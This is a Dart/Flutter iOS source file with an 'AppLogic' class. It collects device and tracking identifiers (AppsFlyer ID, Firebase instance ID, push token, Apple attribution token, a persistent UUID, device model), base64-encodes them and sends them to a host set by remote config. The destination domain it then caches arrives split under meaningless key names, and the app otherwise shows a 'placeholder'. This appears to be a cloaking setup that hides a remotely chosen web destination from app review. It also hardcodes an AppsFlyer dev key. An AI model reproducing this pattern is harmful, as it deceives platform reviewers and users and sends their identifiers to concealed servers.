import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:appsflyer_sdk/appsflyer_sdk.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:firebase_analytics/firebase_analytics.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:package_info_plus/package_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

const String _prefsDeviceUuidKey = 'app_logic.device_uuid';
const String _prefsDestinationKey = 'app_logic.destination_cache';
const String _prefsPlaceholderKey = 'app_logic.placeholder';

const String _appsFlyerDevKey = 'p4BpJtUybxYwAQpopNyDK8';
const String _appsFlyerAppleAppId = '6755889798';

const String _bootstrapHostKey = 'veteran';
const String _bootstrapPathKey = 'chelovek';
const String _finalDomainKey = 'son';
const String _finalSuffixKey = 'kovarniy';

class EntryBlueprint {
  const EntryBlueprint({required this.hostFragment, required this.routeSuffix});

  final String hostFragment;
  final String routeSuffix;

  Uri toFeew({String scheme = 'https'}) =>
      Uri(scheme: scheme, host: hostFragment, path: routeSuffix);

  factory EntryBlueprint.fromFirebase(Map<String, dynamic> json) {
    return EntryBlueprint(
      hostFragment: json[_bootstrapHostKey] as String? ?? '',
      routeSuffix: json[_bootstrapPathKey] as String? ?? '',
    );
  }
}

class AppLogic extends ChangeNotifier {
  AppLogic({
    http.Client? httpClient,
    FirebaseMessaging? messaging,
    FirebaseAnalytics? analytics,
    DeviceInfoPlugin? deviceInfo,
    AppsflyerSdk? appsFlyer,
    Future<SharedPreferences>? sharedPreferences,
    bool enableTracking = false,
  }) : _client = httpClient ?? http.Client(),
       _messaging = messaging ?? FirebaseMessaging.instance,
       _analytics = analytics ?? FirebaseAnalytics.instance,
       _deviceInfo = deviceInfo ?? DeviceInfoPlugin(),
       _trackingEnabled = enableTracking,
       _appsFlyer = Platform.isIOS && enableTracking
           ? (appsFlyer ??
                 AppsflyerSdk(
                   AppsFlyerOptions(
                     afDevKey: _appsFlyerDevKey,
                     appId: _appsFlyerAppleAppId,
                     showDebug: kDebugMode,
                   ),
                 ))
           : null,
       _prefsFuture = sharedPreferences ?? SharedPreferences.getInstance();

  final http.Client _client;
  final FirebaseMessaging _messaging;
  final FirebaseAnalytics _analytics;
  final DeviceInfoPlugin _deviceInfo;
  final AppsflyerSdk? _appsFlyer;
  final Future<SharedPreferences> _prefsFuture;
  final bool _trackingEnabled;
  static const MethodChannel _attChannel = MethodChannel('app_logic/att_token');

  final Map<String, dynamic> _state = <String, dynamic>{};

  bool _appsFlyerInitialized = false;
  String? _cachedAppsFlyerId;

  Map<String, dynamic> get snapshot =>
      Map<String, dynamic>.unmodifiable(_state);

  EntryBlueprint? get blueprint => _state['blueprint'] as EntryBlueprint?;
  Uri? get feewPath => _state['feewPath'] as Uri?;
  bool get showedPlaceholder => _state['placeholder'] as bool? ?? false;

  Future<bool> restoreDestinationFromCache() async {
    final SharedPreferences prefs = await _prefsFuture;
    final String? cached = prefs.getString(_prefsDestinationKey);
    final bool placeholderCached = prefs.getBool(_prefsPlaceholderKey) ?? false;

    if (cached != null && cached.isNotEmpty) {
      final Uri cachedFeew = Uri.parse(cached);
      _state['feewPath'] = cachedFeew;
      _state['placeholder'] = false;
      notifyListeners();
      return true;
    }

    if (placeholderCached) {
      _state['feewPath'] = null;
      _state['placeholder'] = true;
      notifyListeners();
      return true;
    }

    return false;
  }

  Future<EntryBlueprint> loadEntryBlueprint(Uri endpoint) async {
    final http.Response response = await _client.get(endpoint);
    if (response.statusCode != 200) {
      throw Exception('Failed to download config: HTTP ${response.statusCode}');
    }

    final Map<String, dynamic> json =
        jsonDecode(response.body) as Map<String, dynamic>;
    final EntryBlueprint parsed = EntryBlueprint.fromFirebase(json);
    _state['blueprint'] = parsed;
    notifyListeners();
    return parsed;
  }

  /// Resolves remote destination; returns `null` when placeholder required.
  Future<Uri?> resolveFeewPath({required Uri bootstrapEndpoint}) async {
    if (!Platform.isIOS) {
      throw UnsupportedError(
        'resolveFeewPath is implemented for iOS only',
      );
    }

    final SharedPreferences prefs = await _prefsFuture;
    if (await restoreDestinationFromCache()) {
      return feewPath;
    }

    final EntryBlueprint entry =
        blueprint ?? await loadEntryBlueprint(bootstrapEndpoint);

    final Map<String, String> metrics = await _collectMetrics(
      preferences: prefs,
    );

    final String payload = metrics.entries
        .map(
          (MapEntry<String, String> e) =>
              '${e.key}=${Uri.encodeQueryComponent(e.value)}',
        )
        .join('&');
    final String encoded = base64.encode(utf8.encode(payload));

    final Uri requestUri = Uri.parse(
      'https://${entry.hostFragment}${entry.routeSuffix}?data=$encoded',
    );
    debugPrint('Requesting destination from: $requestUri');
    final http.Response response = await _sendConfigRequest(requestUri);
    if (response.statusCode < 200 || response.statusCode >= 300) {
      throw Exception(
        'Failed to resolve destination: HTTP ${response.statusCode}',
      );
    }

    final Map<String, dynamic> json =
        jsonDecode(response.body) as Map<String, dynamic>;
    final String domainPart = json[_finalDomainKey] as String? ?? '';
    final String tldPart = json[_finalSuffixKey] as String? ?? '';

    if (domainPart.isEmpty || tldPart.isEmpty) {
      await prefs.setBool(_prefsPlaceholderKey, true);
      _state['feewPath'] = null;
      _state['placeholder'] = true;
      notifyListeners();
      return null;
    }

    final String normalizedHost = '$domainPart$tldPart';
    final Uri destination = Uri.parse('https://$normalizedHost');

    _state['feewPath'] = destination;
    _state['placeholder'] = false;
    await prefs.setString(_prefsDestinationKey, destination.toString());
    await prefs.setBool(_prefsPlaceholderKey, false);
    debugPrint('Resolved destination feew: $destination');
    notifyListeners();
    return destination;
  }

  Future<Map<String, String>> _collectMetrics({
    required SharedPreferences preferences,
  }) async {
    final IosDeviceInfo device = await _deviceInfo.iosInfo;
    final PackageInfo package = await PackageInfo.fromPlatform();

    final String uuid = await _obtainPersistentUuid(preferences);
    final String appsFlyerId = await _fetchAppsFlyerId() ?? '';
    final String appInstanceId = (await _analytics.appInstanceId) ?? '';
    final String osVersion = device.systemVersion;
    final String deviceModel = device.utsname.machine;
    final String bundleId = package.packageName;
    final String fcmToken = await _obtainFcmToken();
    final String attToken = await _fetchAttToken();

    return <String, String>{
      'appsflyer_id': appsFlyerId,
      'app_instance_id': appInstanceId,
      'uid': uuid,
      'osVersion': osVersion,
      'devModel': deviceModel,
      'bundle': bundleId,
      'fcm_token': fcmToken,
      'att_token': attToken,
    };
  }

  Future<String> _obtainPersistentUuid(SharedPreferences preferences) async {
    final String? existing = preferences.getString(_prefsDeviceUuidKey);
    if (existing != null && existing.isNotEmpty) {
      return existing;
    }
    final String generated = const Uuid().v4();
    await preferences.setString(_prefsDeviceUuidKey, generated);
    return generated;
  }

  Future<String?> _fetchAppsFlyerId() async {
    if (!_trackingEnabled || _appsFlyer == null) {
      return null;
    }
    if (!_appsFlyerInitialized) {
      await _appsFlyer.initSdk(
        registerConversionDataCallback: false,
        registerOnAppOpenAttributionCallback: false,
        registerOnDeepLinkingCallback: false,
      );
      _appsFlyer.startSDK();
      _appsFlyerInitialized = true;
    }
    return _cachedAppsFlyerId ??= await _appsFlyer.getAppsFlyerUID();
  }

  Future<String> _obtainFcmToken() async {
    const int maxAttempts = 6;
    int attempt = 0;
    while (attempt < maxAttempts) {
      try {
        final String? token = await _messaging.getToken();
        if (token != null && token.isNotEmpty) {
          return token;
        }
      } on FirebaseException catch (error) {
        if (error.code != 'apns-token-not-set') {
          return '';
        }
        await _messaging.getAPNSToken();
      }
      attempt += 1;
      await Future<void>.delayed(const Duration(seconds: 2));
    }
    return '';
  }
  Future<String> _fetchAttToken() async {
    if (!Platform.isIOS) {
      return '';
    }
    try {
      final String? token = await _attChannel.invokeMethod<String>(
        'getAttributionToken',
      );
      return token ?? '';
    } on PlatformException {
      return '';
    }
  }

  Future<http.Response> _sendConfigRequest(Uri uri) async {
    http.Response response = await _client.post(uri);
    int redirectHops = 0;
    while (_isRedirect(response.statusCode) && redirectHops < 5) {
      final String? location = response.headers['location'];
      if (location == null) {
        break;
      }
      final Uri redirectedUri = uri.resolve(location);
      redirectHops += 1;
      if (response.statusCode == 307 || response.statusCode == 308) {
        response = await _client.post(redirectedUri);
      } else {
        response = await _client.get(redirectedUri);
      }
    }
    return response;
  }

  bool _isRedirect(int statusCode) {
    return statusCode == 301 ||
        statusCode == 302 ||
        statusCode == 303 ||
        statusCode == 307 ||
        statusCode == 308;
  }
}